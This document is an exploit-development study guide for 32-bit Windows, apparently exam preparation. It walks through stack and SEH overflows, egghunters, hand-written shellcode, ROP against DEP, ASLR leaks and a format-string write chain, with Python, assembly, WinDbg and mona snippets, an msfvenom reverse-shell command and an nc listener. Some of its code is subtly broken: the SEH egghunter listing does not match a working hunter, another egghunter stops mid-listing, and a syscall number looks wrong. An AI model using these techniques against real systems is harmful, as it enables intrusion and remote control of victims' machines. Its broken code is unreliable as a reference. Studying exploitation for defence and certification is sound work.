1. Tools & Setup

The Windows user-mode exploit development workflow runs against a 32-bit Windows 10 VM with DEP and ASLR enabled, debugged from WinDbg scripted with pykd, and reverse-engineered in IDA Pro or Ghidra. Keep a Kali VM alongside for msfvenom, pattern tools, and listeners.

2. x86 Architecture

32-bit x86 is the entire scope here. You need the memory layout, the register set, the calling conventions, and a small instruction vocabulary to read disassembly, reason about overflows, and write shellcode.

2.1 Program Memory Layout

A process splits into a text segment (executable, read+execute only), data/BSS for globals/statics (initialized and uninitialized), a heap for dynamic allocations growing upward, and a stack for locals, saved frame pointers, return addresses, and function arguments — growing downward from high to low addresses.

2.2 CPU Registers

Hijacking EIP is the entire point of exploitation; the other registers shape how you get there and what your shellcode can do.

RegisterRole in Exploitation
EIPInstruction pointer — address of next instruction; hijacking this = code execution
ESPStack pointer (top of stack, lowest addr); shellcode lives here after overflow
EBPFrame base pointer; offset arithmetic used to find EIP offset
EAXAccumulator; holds return values; ROP gadget for API argument passing
EBX / ECX / EDXGeneral purpose; ECX often loop counter, EDX I/O; used in ROP chains
ESI / EDISource/destination index; egghunter uses ESI/EDI to scan memory
EFLAGSZF, CF, OF drive conditional jumps in shellcode and ROP chains

2.3 The Stack & Calling Conventions

The stack grows high → low; PUSH decrements ESP by 4 and writes, POP reads and increments ESP by 4. stdcall (Win32 APIs) pushes arguments right-to-left, returns in EAX, and the callee cleans the stack with RETN N. cdecl (C runtime) makes the caller clean via ADD ESP, N after the call. A CALL pushes the return address (EIP + instruction size); RET pops it back into EIP — that’s the value a stack overflow overwrites. All values are little-endian: the address 0x10090c83 is written in memory as \x83\x0c\x09\x10.

2.4 Common Instructions

mov  eax, ebx        ; eax = ebx
xor  eax, eax        ; eax = 0  (null-byte-free zeroing)
push eax             ; esp -= 4; [esp] = eax
pop  ecx             ; ecx = [esp]; esp += 4
call eax             ; [esp] = eip+2; jmp eax
jmp  esp             ; jump to address in ESP (classic redirect after EIP overwrite)
ret                  ; pop eip  (ROP "glue")
retn 4               ; pop eip; esp += 4  (stdcall cleanup)
add  esp, 0x10       ; stack pivot / cleanup
sub  esp, 0x40       ; make space for shellcode (avoid overwriting)
int  0x2e            ; legacy Windows syscall gate (used in egghunters)
lea  eax, [ebp-0x8]  ; load effective address (no memory read)
test eax, eax        ; set ZF if eax=0 (non-destructive check)
jnz  label           ; jump if ZF=0 (conditional jump in shellcode)

4. Stack Buffer Overflows

The canonical Windows exploitation primitive: overflow a stack buffer to overwrite the saved return address, redirect EIP to a JMP ESP in a non-ASLR module, and land on shellcode that follows it on the stack.

4.1 Theory

A stack buffer overflow overwrites the saved return address pushed by CALL and consumed by RET. When the function executes RET, EIP becomes your value. Point it at a JMP ESP gadget in a non-ASLR module and your shellcode — sitting right after EIP on the stack — executes.

4.2 Step-by-Step Workflow

Crash the target with progressively larger inputs (attach WinDbg first to capture the fault state) until EIP reads 41414141. Send a msf-pattern_create buffer, read EIP, and resolve the offset with msf-pattern_offset. Confirm precise control by sending A*offset + B*4 — EIP must read 42424242 exactly. Inspect db esp L8 to see what follows. Count contiguous bytes after ESP until a null or buffer end to measure shellcode space; under ~400 bytes, plan for an egghunter (§8). Then enumerate bad characters (§5) and pick a return address (§5.5). Finally stage NOP sled + shellcode after EIP.

5. Bad Characters & Return Addresses

Bad characters are bytes the application transforms or truncates before they reach memory; the return address you pick must come from a module without ASLR (and, for SEH, without SafeSEH) and contain none of those bad bytes.

5.1 Finding Bad Characters

Send every byte from \x01 through \xff after your EIP overwrite, then compare memory against the expected sequence. Where the sequence breaks or skips, that byte is bad. One bad char can mask the next, so remove confirmed bad bytes and repeat until the full array lands clean. Usual suspects: \x00 (null), \x0a (LF), \x0d (CR); protocol-specific: \x20 (space), \x26 (&), \x3d (=).

# Generate \x01..\xff test array
badchars = bytes(range(1, 256))   # exclude \x00 (always bad)
buf = b"A" * OFFSET + JMP_ESP + badchars
# Send, then inspect the region starting at ESP:
# WinDbg: compare memory against the expected sequence
db esp L100
# Where the byte sequence breaks or changes -> that byte is bad
# Remove it and repeat until the full sequence lands clean.

!py mona bytearray -b "\x00"               # write bytearray without \x00
!py mona compare -f C:\mona\bytearray.bin -a esp  # compare memory to file

5.2 Finding a Return Address (JMP ESP)

You need an address that redirects to where your shellcode sits. If shellcode is at ESP, use JMP ESP / CALL ESP / PUSH ESP; RET; if a different register points near your buffer, use the matching jump (JMP EAX, etc.). Source it from a module without ASLR, and verify the address bytes contain no bad chars.

6. SEH-Based Overflows

When the overflow tramples a stack-resident exception registration record instead of a saved return address, you exploit it by overwriting the handler pointer so the exception dispatcher transfers control to a gadget of your choice.

6.1 Structured Exception Handling Theory

Windows maintains a singly-linked list of exception registration records on the stack. Each record is two 4-byte fields: nSEH (pointer to the next record) and SEH (pointer to the handler function). When an exception fires, the OS dispatcher walks this chain, calling each handler. A large overflow can overwrite one of these records; the overflow itself typically triggers an access violation, which hands control to the dispatcher with your overwritten handler pointer. Modern Windows enforces SEH validation: SafeSEH checks a per-module exception handler table, and SEHOP verifies the chain terminates at a known sentinel.

6.2 Bypassing SafeSEH / SEHOP

Source your POP/POP/RET gadget from a module compiled without SafeSEH (SafeSEH=False in mona’s table). For SEHOP, ensure the chain still terminates correctly; Windows 7 is largely silent, Windows 10 is more restrictive — find a module without SEHOP enforcement and prefer it.

6.3 Exploitation Steps

Overflow to overwrite the SEH record — the overflow itself triggers an access violation. Set SEH (handler pointer) to a POP r32 / POP r32 / RET gadget from a SafeSEH-free module: the two POPs skip the “extra” items the dispatcher pushes, and RET returns into nSEH. Set nSEH to a short jump forward (\xeb\x06\x90\x90 = JMP +6, padded with NOPs) to hop over the SEH field into your shellcode. Find the offset to the SEH record with a cyclic pattern and confirm with !exchain.

# After crash: inspect the SEH chain to confirm your overwrite
!exchain
# Should show: 0xXXXXXXXX: invalid (your pattern value) -> that is the SEH handler

# Find a POP POP RET in a SafeSEH-free module
!py mona seh -b "\x00\x0a\x0d"
# Or search manually for 5? 5? c3
s -[1]b 0 L?80000000 5? 5? c3

6.4 Island-Hopping in Assembly

After nSEH short-jumps into the buffer, you may have only a small window before the next SEH record or EIP alignment eats your space. Chain short jumps to hop between “islands” of usable space throughout the buffer — a 2-byte short JMP can reach ±127 bytes, and a 5-byte near JMP reaches ±2 GB.

# Short jump: 2 bytes, range +-127 bytes relative to next instruction
nseh_jmp = b"\xeb\x06\x90\x90"    # JMP +6 (hops over the 4-byte SEH field)

# Near jump: 5 bytes, range +-2GB
# If you need to jump backward into a large A-buffer:
near_jmp_back = b"\xe9" + struct.pack("<i", -300)  # JMP -300 (signed offset)

# Pattern: [padding][nSEH=short jmp fwd][SEH=POP/POP/RET][NOP sled][shellcode]
buf  = b"A" * offset_to_nseh
buf += nseh_jmp         # nSEH: short jump forward
buf += struct.pack("<I", ppr_addr)   # SEH: POP POP RET
buf += b"\x90" * 16
buf += shellcode

7. Reverse Engineering (IDA Pro & Ghidra)

You receive closed-source binaries, so static reverse engineering is how you find the bug. IDA Pro is the course tool; Ghidra is a capable free alternative with an integrated decompiler.

7.2 IDA Pro Bug-Finding Workflow

Start at the entry points for attacker data — recv, WSARecv, ReadFile, fread, file parsers — via the Imports tab; use X to trace callers. Follow the tainted buffer downstream through cross-references and rename functions as you understand them (sub_401234 → parse_header). Audit callers for unbounded copies: strcpy, strcat, sprintf, memcpy/CopyMemory with attacker-controlled length, and memmove. The Hex-Rays decompiler (F5) makes complex loops readable; watch for patterns like while(*src++) *dst++ = *src without length checks. The graph view helps follow control flow and protocol state machines.

7.3 Sync IDA with WinDbg

Compute runtime_addr = runtime_base + (IDA_addr - IDA_imagebase) and set matching breakpoints in both tools to walk the program in parallel. To watch the raw input buffer as the server receives it, hook recv in WinDbg: poi(esp+8) is the third argument to recv() — the buffer pointer.

7.6 Protocol Reverse Engineering Workflow

A representative target is the IBM Tivoli FastBackServer protocol; the workflow applies to any custom binary protocol. Hook ws2_32!recv in WinDbg and dump the buffer on every call to see the raw bytes the server receives. Correlate with IDA: find the function calling recv, rename it network_recv, and follow data flow into parsing routines. Identify header fields by spotting length extractions (e.g. mov eax, [buf+4] often pulls a 4-byte length at offset 4) and any checksum/magic validation. Reverse the checksum algorithm and reimplement it in Python so your exploit packets pass validation. The vulnerability is usually an attacker-controlled length flowing into a memcpy / CopyMemory with a fixed destination buffer.

# Re-implement a reversed checksum in Python (example: additive XOR checksum)
def calc_checksum(data: bytes) -> int:
    cksum = 0
    for b in data:
        cksum = ((cksum << 1) | (cksum >> 31)) & 0xFFFFFFFF  # ROL 1
        cksum ^= b
    return cksum & 0xFF

def build_packet(opcode: int, payload: bytes) -> bytes:
    header_len = 0x10
    total_len  = header_len + len(payload)
    pkt  = b"\x01\x00"               # magic
    pkt += opcode.to_bytes(2, "little")
    pkt += total_len.to_bytes(4, "little")
    pkt += b"\x00" * 4               # reserved
    pkt += calc_checksum(pkt[:12]).to_bytes(4, "little")
    pkt += payload
    return pkt

8. Egghunters & Space Restrictions

When the buffer after EIP or nSEH is too small for full shellcode, drop a tiny egghunter there that scans memory for an 8-byte tag prefixing your real shellcode in a larger buffer, then jumps to it.

8.1 When to Use an Egghunter

Whenever the buffer immediately after EIP or nSEH is too small for full shellcode (under ~400 bytes), use a tiny egghunter there. The egghunter scans the entire process memory for a known 8-byte tag (the “egg”, e.g. w00tw00t) prefixing your real shellcode, then jumps to it. Deliver the real shellcode — arbitrarily large — in any other reachable buffer (a different field in the same protocol packet, a previous request, or the heap).

8.2 Partial EIP Overwrite

If a buffer overflow is terminated by a null byte before you can write a full 4-byte EIP, you can still overwrite the low bytes. A 1- or 2-byte partial overwrite can redirect EIP to a nearby address within the same page (where the upper bytes already point to the correct module — no relocation needed).

# Partial overwrite: change only the low byte of EIP
# Current EIP: 0x00401070  -> overwrite low byte to 0x90 -> 0x00401090
# That address must be within the current module (no relocation needed)
buf = b"A" * offset + b"\x90"   # only 1 byte after the padding

8.5 NtAccessCheck Egghunter (Keystone)

The course-taught egghunter uses NtAccessCheckAndAuditAlarm (syscall 0x02 on Windows 7/10 x86) to safely probe each page — if the page is not readable, the syscall sets the error and continues rather than crashing.

from keystone import *

EGGHUNTER_ASM = """
    loop_inc_page:
        or  dx, 0xfff           ; round up to next page boundary
    loop_inc_one:
        inc edx                 ; advance one byte
    is_accessible:
        push edx                ; save pointer
        push 0x02               ; NtAccessCheckAndAuditAlarm syscall number

"""

8.6 SEH-Based Egghunter (Portable)

The basic syscall egghunter can fault on certain Windows versions. The SEH-based variant installs a local exception handler so access violations during the scan are caught and execution continues — making it portable from Windows XP through Windows 10.

SEH_EGGHUNTER_ASM = """
    start:
        jmp  get_seh_address     ; jump to get the SEH handler address
    egghunter:
        pop  ecx                 ; pop SEH address into ECX
        mov  [ecx+0x4], ecx     ; install SEH handler (store addr in record)
        or   ecx, 0xfff          ; ECX -> top of current page
    next_addr:
        inc  ecx                 ; advance to next byte
        lea  eax, [ecx+0x4]     ; EAX = address in next page
        xchg eax, esp            ; swap SEH frame pointer with stack
        sub  esp, 0x208          ; reserve SEH frame space
    try_access:
        mov  eax, 0x74303077    ; "w00t"
        cmp  dword ptr [ecx], eax   ; check for first egg half
        jne  next_addr
        cmp  dword ptr [ecx+4], eax ; check for second egg half
        jne  next_addr
    found_shellcode:
        jmp  ecx                 ; jump into shellcode after the egg
    get_seh_address:
        call egghunter           ; push EIP (SEH address), jump back
"""
# Result: ~60 bytes; works on Windows 7, 8.1, 10 (all x86)

9. Creating Custom Shellcode

Encoders can’t always avoid every bad character or fit a tight space. The alternative is hand-written shellcode that resolves Win32 APIs at runtime from the PEB — portable across Windows versions and free of hardcoded addresses.

9.1 The System Call Problem

You cannot hardcode syscall numbers in portable shellcode — they differ between Windows versions. Instead, resolve Win32 API addresses at runtime by navigating PEB → Ldr → module list → PE Export Address Table.

9.2 Finding kernel32.dll via the PEB

Read the PEB at fs:[0x30], follow PEB->Ldr at offset 0x0C, then walk InMemoryOrderModuleList at +0x14 to find kernel32’s DllBase without a fixed address. On Windows 7/10 the order is ntdll → the app → kernel32 — walk to the third entry, then read +0x10 for the base.

; fs:[0x30] -> PEB
; PEB+0x0C -> PEB_LDR_DATA*
; PEB_LDR_DATA+0x14 -> InMemoryOrderModuleList (doubly-linked, first entry = self)
; Each LIST_ENTRY+0x10 -> DllBase of the module
; Walk to 3rd entry to reach kernel32.dll (ntdll=1st, app=2nd, kernel32=3rd on Win7-10)

find_kernel32:
    mov  eax, fs:[0x30]      ; EAX = PEB
    mov  eax, [eax+0x0C]     ; EAX = PEB->Ldr
    mov  eax, [eax+0x14]     ; EAX = first InMemoryOrderModuleList entry (Flink)
    mov  eax, [eax]          ; EAX = second entry (skip self)
    mov  eax, [eax]          ; EAX = third entry (kernel32 on most targets)
    mov  eax, [eax+0x10]     ; EAX = DllBase of kernel32.dll

9.3 Resolving Symbols via the Export Address Table

Parse kernel32’s PE Export Directory to find any exported function by hashing its name. This avoids hardcoded addresses and works across patch levels.

; Given EAX = kernel32 DllBase:
; PE Header: [EAX+0x3C] -> offset to PE signature
; PE+0x78 -> RVA of Export Directory
; Export Dir+0x18 -> NumberOfNames
; Export Dir+0x1C -> AddressOfFunctions  (EAT: array of RVAs)
; Export Dir+0x20 -> AddressOfNames      (ENT: array of name RVAs)
; Export Dir+0x24 -> AddressOfNameOrdinals (EOT: name->ordinal mapping)

find_function:
    ; EBP = DllBase, ECX = target hash
    mov  edx, [ebp+0x3C]        ; RVA of PE header
    mov  edx, [ebp+edx+0x78]    ; RVA of Export Directory
    add  edx, ebp                ; VA of Export Directory
    mov  esi, [edx+0x20]        ; RVA of AddressOfNames
    add  esi, ebp                ; VA of AddressOfNames
    xor  ecx, ecx
next_function_loop:
    inc  ecx
    lodsd                        ; EAX = RVA of next name, ESI advances
    add  eax, ebp                ; VA of function name string
    call compute_hash            ; hash it (see below)
    cmp  eax, [esp+0x28]        ; compare to target hash
    jne  next_function_loop
    ; found: get address from EAT using the ordinal
    mov  esi, [edx+0x24]        ; RVA of AddressOfNameOrdinals
    add  esi, ebp
    mov  cx, [esi+ecx*2-2]     ; ordinal of matched name
    mov  esi, [edx+0x1C]       ; RVA of AddressOfFunctions
    add  esi, ebp
    mov  edx, [esi+ecx*4]      ; RVA of function
    add  edx, ebp               ; VA of function -> EDX
    ret

9.4 Computing Function Name Hashes

Pre-compute the ROR-13 hash of each function name you need (LoadLibraryA, GetProcAddress, VirtualAlloc, etc.) and bake the hash into the shellcode. The runtime resolver matches hashes instead of strings, keeping the payload small.

# Compute the hash used to find a function by name (ROR-13 variant common in shellcode)
import struct

def ror32(val, bits):
    return ((val >> bits) | (val << (32 - bits))) & 0xFFFFFFFF

def hash_name(name: str) -> int:
    h = 0
    for c in name + "\x00":    # include null terminator
        h = ror32(h, 13)
        h = (h + ord(c)) & 0xFFFFFFFF
    return h

# Pre-compute hashes for the functions you need
for fn in ["LoadLibraryA", "GetProcAddress", "VirtualAlloc",
           "WinExec", "WSAStartup", "WSASocket", "WSAConnect", "CreateProcessA"]:
    print(f"  0x{hash_name(fn):08x}  {fn}")

9.5 NULL-Free Position-Independent Code

Avoid \x00 in every byte of shellcode (most protocols null-terminate). Replace mov eax, 0x00000001 with xor eax,eax; inc eax. To push "calc\x00" null-free, first xor ecx,ecx; push ecx for the terminator, then push 0x636c6163. Position-independence comes from the CALL/POP “delta” trick: CALL to the next label pushes EIP; POP ESI recovers the runtime address; subtract a small constant to find the shellcode base.

; Avoid \x00 bytes in the shellcode (most protocols null-terminate)
; BAD:  mov eax, 0x00000001  ; contains \x00 bytes
; GOOD: xor eax, eax  /  inc eax   ; 0x00000001 without null bytes
; BAD:  push 0x00636c6163 ("calc" with leading null)
; GOOD: xor ecx, ecx  /  push ecx  /  push 0x636c6163  (null terminator first)

; Position-independent: use CALL/POP to get runtime EIP (delta technique)
    call  delta
delta:
    pop   esi                ; ESI = runtime address of 'delta' label
    sub   esi, 5             ; ESI = start of shellcode
    ; Now use [esi + offset_to_data] for all data references

; String "calc" pushed null-free onto the stack:
    xor   ecx, ecx
    push  ecx                ; null terminator
    push  0x636c6163         ; "clac" -> memory is "calc\x00"
    mov   eax, esp           ; EAX -> "calc"

10. Bypassing DEP with ROP

DEP marks the stack non-executable, so direct shellcode jumps fault. ROP chains existing executable code snippets ending in RET to call a Win32 API that makes memory executable, then returns into shellcode.

10.1 DEP Theory & Windows Defender Exploit Guard

Data Execution Prevention marks all writable memory pages (stack, heap) non-executable, so a jump to shellcode on the stack faults instead of executing. Windows Defender Exploit Guard enforces DEP at the process level; confirm it from WinDbg with !vprot esp — a page protection of PAGE_READWRITE (no execute) means DEP is on.

# Confirm DEP status for a process from WinDbg
!vprot esp       # page at ESP should show PAGE_READWRITE (not executable)
# If PAGE_EXECUTE_READWRITE -> DEP is off for this process
# !address esp -> shows "Protect: 4" (RW, no execute) -> DEP is on

10.2 Return-Oriented Programming Origins & Evolution

ROP was introduced by Hovav Shacham in 2007. Instead of injecting new code, it chains existing executable code snippets (“gadgets”) ending in RET. Each RET pops the next gadget address from the stack, so the attacker’s data on the stack drives execution forward through a series of short native instructions. The goal: call a Win32 API that marks a memory region executable, then return into shellcode.

11. Bypassing ASLR

ASLR randomizes module bases each load. Bypass with a non-ASLR module if one exists, leak a runtime pointer to recompute the base, or use a partial overwrite that only changes the low bytes of an address within the same page.

11.1 ASLR Theory

ASLR randomizes module base addresses at each load (system boot or process start). The entropy is limited — about 8 bits on 32-bit Windows 10 — so roughly 256 possible positions exist for any given DLL base. Brute force is rarely the right answer, though; more surgical bypasses are the standard approach.

11.2 Non-ASLR Modules (Easiest Bypass)

If any loaded DLL was built without /DYNAMICBASE, take all addresses (JMP ESP, ROP gadgets, API pointers) from it. This is the simplest and most common path — many older third-party DLLs and COM objects are compiled without ASLR. mona’s modules command tabulates this; compare bases across reboots in lm to confirm.

!py mona modules    # table: ASLR=True/False per module
lm                  # check whether bases change across reboots
# If ANY loaded module has ASLR=False, use addresses (gadgets, IAT) from that module.
# Many older third-party DLLs and COM objects are compiled without /DYNAMICBASE.

11.3 Information Leaks for ASLR Bypass

If every loaded module is ASLR-enabled, leak a runtime pointer via a memory disclosure (format string, over-read, heap info leak), then compute the module base at exploit time and rebase every gadget address.

# Example: format string leaks a stack pointer belonging to a module
# The server returns 4 bytes at stack offset N when we send %N$x
# We see: 0x6f2a1234 -- subtract the known offset-within-module (from IDA)
# to get the module base.

def rebase(leaked_addr: int, leak_offset_in_module: int) -> int:
    """Compute module base from a leaked pointer."""
    return leaked_addr - leak_offset_in_module

# Then: gadget_runtime = module_base + (gadget_IDA_addr - IDA_imagebase)
def gadget_addr(base: int, gadget_static: int, imagebase: int = 0x400000) -> int:
    return base + (gadget_static - imagebase)

11.4 Partial Overwrite

Overwrite only the low 1–2 bytes of a saved pointer; the high bytes stay valid (already pointing into the correct module), and only the page-relative offset changes. Useful when a null byte terminates your overflow before you can write a full 4-byte address, but you can still write 1–2 non-null bytes. Requires that your target address shares the high bytes with the original value — both within the same 64 KB or 16 MB aligned region.

When user input reaches a printf-family function as the format string itself, the format specifiers read from and write to memory — giving you both an info leak (defeats ASLR) and an arbitrary write.

12.1 Format String Theory

The vulnerability lives in C/C++ code where attacker-controlled data reaches a printf-family function as the first argument instead of as a data argument. printf(user_input) is exploitable; printf("%s", user_input) is not. 12.4 Write Primitive with %n (Part II)

The %n specifier writes the number of bytes printed so far into the address pointed to by the corresponding argument. By carefully crafting the format string — place the target address on the stack, inflate the byte count with width specifiers, and write 2 bytes at a time with %hn — you can write any 4-byte value to any writable address.

# Strategy: write value V to address A
# - Place A on the stack (it will be the pointer %n reads)
# - Use field-width padding (%Wx) to inflate the printed byte count to V
# - Use %hn twice (two 2-byte writes) to avoid overflow with very large values

def write_dword(addr: int, value: int) -> bytes:
    """Build a format string that writes 'value' to 'addr' via %n."""
    lo = value & 0xFFFF          # lower 2 bytes
    hi = (value >> 16) & 0xFFFF  # upper 2 bytes

    # Place addr (lo half) and addr+2 (hi half) on the stack
    targets = struct.pack("<I", addr) + struct.pack("<I", addr + 2)

    # Calculate padding to reach each target value
    # Assumes targets are at stack offset N (determine experimentally)
    stack_offset_lo = 22   # adjust per target
    stack_offset_hi = 23

    # Build: print (lo) bytes for low half, write %hn, then print more for high half
    already_printed = len(targets)
    pad_lo = (lo - already_printed) % 0x10000
    pad_hi = (hi - lo) % 0x10000

    fmt  = targets
    fmt += f"%{pad_lo}x".encode() if pad_lo > 0 else b""
    fmt += f"%{stack_offset_lo}$hn".encode()
    fmt += f"%{pad_hi}x".encode() if pad_hi > 0 else b""
    fmt += f"%{stack_offset_hi}$hn".encode()
    return fmt

# Located by tracing the function call chain and measuring the frame depth.

# After ASLR bypass leak + write primitive:
target_eip_addr = leaked_stack_base + SAVED_EIP_OFFSET  # stack addr of saved EIP
new_eip = module_base + ROP_CHAIN_GADGET_OFFSET         # start of our ROP chain

write_fmt = write_dword(target_eip_addr, new_eip)
send_fmt(build_packet(write_fmt))

12.6 Stack Pivot for ROP After Format String

After overwriting EIP with a gadget, ESP needs to point at your ROP chain. If it doesn’t already land on controllable data, use a stack pivot — XCHG EAX, ESP; RET when EAX points to your chain, ADD ESP, N; RET to move into a different region, or LEA ESP, [EAX+N]; RET for a register-relative redirect.

; Stack pivot gadgets:
xchg eax, esp ; ret     ; swap EAX (controlled) with ESP, then RET pops from new stack
add  esp, 0x200 ; ret   ; move ESP into a different region
lea  esp, [eax+0x8] ; ret  ; set ESP to controlled register + offset
sub  esp, 0x40 ; ret    ; move ESP backward into the buffer

; Technique: ensure EAX or another register points to your ROP chain payload
; Then use XCHG EAX,ESP to redirect the stack there, and the chain executes.

12.7 Getting Code Execution (Full Chain)

Combine the leak, the write primitive, and the ROP chain in a single script. Send a request that gets the server to log a format string you control, leak a code pointer via %N$x, compute the module base, calculate the saved-EIP address, write the ROP chain start there with %hn, and trigger the function’s return — the ROP chain calls VirtualAlloc/WriteProcessMemory and returns into shellcode.

"""
Full format string exploit chain:
1. Send a request that causes the server to log a format string we control.
2. Leak the ASLR offset: send %N$x payloads and identify a code pointer.
3. Compute module base from the leaked pointer.
4. Compute the target address (saved EIP in the logging function's frame).
5. Write our ROP chain address to the saved EIP using %hn write primitive.
6. The next request causes the function to return -> EIP = our ROP chain start.
7. ROP chain calls VirtualAlloc or WriteProcessMemory to mark shellcode executable.
8. ROP chain returns into shellcode -> reverse shell.
"""
def exploit():
    # Stage 1: Leak
    leaked = leak_aslr(LEAK_OFFSET)
    base   = leaked - KNOWN_OFFSET_IN_MODULE

    # Stage 2: Compute addresses
    rop_start = base + ROP_CHAIN_RVA    # first gadget of our chain
    saved_eip = leak_stack_addr()       # also leak saved EIP address via %s / %p

    # Stage 3: Write
    write_fmt = write_dword(saved_eip, rop_start)
    send_request(build_packet(write_fmt))

    # Stage 4: Trigger
    trigger_request()   # causes the function to return, executing our ROP chain
    print("[+] Reverse shell triggered")

13. Methodology

A repeatable, exam-ready workflow from receiving a closed-source binary to a documented, reliable reverse shell. Complete each stage fully before advancing — a skipped step here causes a silent failure two steps later. Keep a running PoC Python script that you extend at each stage; version-control it or at minimum save snapshots.

13.1 Pre-Exam Setup

  • Boot Windows 10 x86 VM (DEP and ASLR on, do NOT disable them)
  • Open WinDbg and confirm symbol server is set: .sympath srv*C:\symbols*https://msdl.microsoft.com/download/symbols
  • Load pykd: .load pykd; run a sanity script to confirm it works
  • Confirm Kali tools accessible: msf-pattern_create, msfvenom, msf-nasm_shell, ropper/rp++
  • Open target binary in IDA Pro (or Ghidra); run auto-analysis; wait for completion before starting any RE work
  • Prepare your Python exploit skeleton template (imports, send wrapper, struct.pack helper)
  • Start a Netcat listener: nc -lvnp 443
  • Snapshot the VM before touching the target service (easy revert for testing)

13.2 Target Recon & Enumeration

  • Identify the listening port(s): netstat -ano, nmap -sV -p- 127.0.0.1
  • Determine the protocol: TCP, UDP, HTTP, custom binary. Send a manual request and observe the response.
  • Run strings target.exe | grep -iE "recv|read|listen|bind|version|author" for quick clues
  • In IDA/Ghidra, check the Imports tab: identify recv, WSARecv, ReadFile, fgets, scanf (input functions), and strcpy, memcpy, sprintf (copy sinks)
  • Check module protections: !py mona modules. Note which modules are non-ASLR and non-SafeSEH — all gadgets and return addresses will come from here.
  • Confirm DEP: !vprot esp — if not PAGE_EXECUTE*, DEP is active on the stack.
  • Record exact Windows version: winver / ver. Egghunter syscall numbers differ by version.

13.3 Reverse Engineering the Binary

  • In IDA/Ghidra: locate recv / WSARecv in the Imports tab; press X to see all call sites. Start here — this is where attacker data enters.
  • In WinDbg: hook recv with a breakpoint-action: bp ws2_32!recv "da poi(esp+8) L?400; g". Send a known test string and confirm it lands in the breakpoint dump.
  • Synchronize WinDbg with IDA: compute runtime_addr = runtime_base + (IDA_addr - IDA_imagebase). Set matching breakpoints in both to walk in parallel.
  • In IDA: follow the tainted buffer from recv downstream through cross-references (X). Rename every function you understand as you go.
  • Use the decompiler (F5 in IDA / Ghidra decompiler pane) to understand complex parsing loops. Watch for length fields copied without bounds checking.
  • If the protocol has a checksum or magic bytes: reverse-engineer the algorithm and implement it in Python so your exploit packets pass validation.
  • Identify the exact vulnerable function: which memcpy/strcpy/sprintf takes an attacker-controlled length or unchecked string? Note the destination buffer address and size from the stack frame.
  • Classify the bug: direct EIP overwrite (stack overflow), SEH overwrite, write-what-where, or format string?

13.4 Crash Triage

  • Build a minimal fuzzer: send increasing buffer sizes (100, 200, 400 … 5000 bytes) until the service crashes with EIP = 41414141.
  • Capture the fault state in WinDbg: r (registers), !exchain (SEH), db esp L40 (stack), u eip (code at crash).
  • Confirm the crash class:
    • Stack overflow: EIP = 41414141, ESP points into your buffer
    • SEH overflow: EIP = 7c802898 (OS handler dispatch), !exchain shows 41414141
    • Format string: EIP unchanged but memory reads/writes reflect your specifiers
  • Build a minimal, reliable reproduction script that crashes the target cleanly and consistently.
  • Confirm the target restarts cleanly after a crash (or understand how to restart it). The exam scoring depends on reliable exploitation, not one-shot luck.

13.5 Gaining EIP / SEH Control

  • Generate a cyclic pattern: msf-pattern_create -l 3000. Send it as the payload.
  • Read EIP (stack overflow) or !exchain SEH value from WinDbg. Run msf-pattern_offset -l 3000 -q <value> to get the exact byte offset.
  • Confirm control: send A*offset + B*4. EIP or SEH must read exactly 42424242. Check db esp L16 to see what follows.
  • Measure shellcode space: from ESP forward (or from the A-buffer before EIP), count bytes until a null or end of buffer. Decision tree:
    • ≥ 400 bytes at ESP → direct shellcode after EIP
    • < 400 bytes but large earlier buffer → egghunter after EIP, real shellcode in A-buffer
    • Protocol delivers multiple packets → send shellcode in earlier packet to heap, egghunt for it

13.6 Bad Character Enumeration

  • Send A*offset + B*4 + bytes(\x01..\xff) (all bytes except \x00).
  • In WinDbg: db esp L100. The sequence should read 01 02 03 04 .... Where it breaks or skips, that byte is bad.
  • Use mona to automate comparison: !py mona bytearray -b "\x00" then !py mona compare -f bytearray.bin -a esp.
  • Remove the confirmed bad character from the test array and repeat. One bad char can hide the next — iterate until the full array lands clean.
  • Record the final bad char list. Every address byte and shellcode byte must avoid all entries in this list.
  • Double-check common culprits: \x00, \x0a, \x0d; also protocol-specific: \x20 (space), \x2f (/), \x26 (&), \x3d (=).

13.7 Return Address & SEH Gadget Selection

  • From !py mona modules, pick a module with ASLR=False (and SafeSEH=False for SEH exploits). Prefer application DLLs over OS DLLs.
  • Search for JMP ESP (stack) or POP POP RET (SEH) within the chosen module.
  • Verify the address bytes contain no bad characters. Try multiple candidates if the first fails.
  • Set a breakpoint at the chosen address in WinDbg and confirm execution lands there when the exploit fires.
  • For SEH: after POP/POP/RET lands at nSEH, confirm the short jump takes you to the shellcode NOP sled. Adjust nSEH jump offset if needed.

13.8 Shellcode Staging

  • Generate shellcode: msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=Y -f python -e x86/shikata_ga_nai -b "<badchars>"
  • Confirm shellcode fits in the available space (shikata adds ~25 bytes overhead; allow buffer for NOP sled).
  • Prepend a 16-byte NOP sled (\x90*16) before shellcode for reliability against minor stack position variance.
  • Test shellcode works: temporarily disable DEP if needed to confirm the payload logic before tackling mitigation bypass.
  • If using egghunter: build the egg tag (b"w00tw00t" = 8 bytes) prefix, deliver it in the large buffer, and send the egghunter in the small-space buffer. Confirm the hunter finds the egg.
  • For SEH-based egghunter on Windows 10: use the SEH-based variant; test on both Windows 7 and 10 if possible.

13.9 Defeating DEP (ROP)

  • Confirm DEP is active: !vprot esp shows PAGE_READWRITE (no execute).
  • Enumerate gadgets from non-ASLR module: rp-win-x86.exe -f target.dll --rop 5 --unique > gadgets.txt
  • Choose your API target:
    • VirtualAlloc → allocate RWX memory, copy shellcode, jump in
    • VirtualProtect → mark existing stack page executable
    • WriteProcessMemory → copy shellcode into an existing code section
  • Build the ROP chain: find gadgets to set up each API argument in registers/stack. Use PUSHAD if available to batch the call frame in one shot.
  • Dereference the IAT to get the runtime API address (avoids hardcoding a possibly-ASLR-shifted address).
  • If ESP doesn’t land on your ROP chain, insert a stack pivot gadget (XCHG EAX,ESP;RET or ADD ESP,N;RET).
  • If remaining bad chars still hit shellcode: XOR-encode the shellcode and add a ROP decoder stub that writes decoded bytes to the RWX region before jumping in.
  • Test: set a breakpoint at the start of your ROP chain in WinDbg, single-step through each gadget, confirm the API call fires with correct arguments, and confirm EAX returns the expected address.

13.10 Defeating ASLR

  • Run !py mona modules — if ANY module has ASLR=False, use it for all gadget/return addresses. Skip the leak step.
  • If all modules are ASLR-enabled: look for an information disclosure (format string, over-read). Identify which stack or heap offset holds a code pointer belonging to a known module.
  • For format string targets: send %1$x %2$x ... %60$x incrementally until you see values that fall within a loaded module’s expected range.
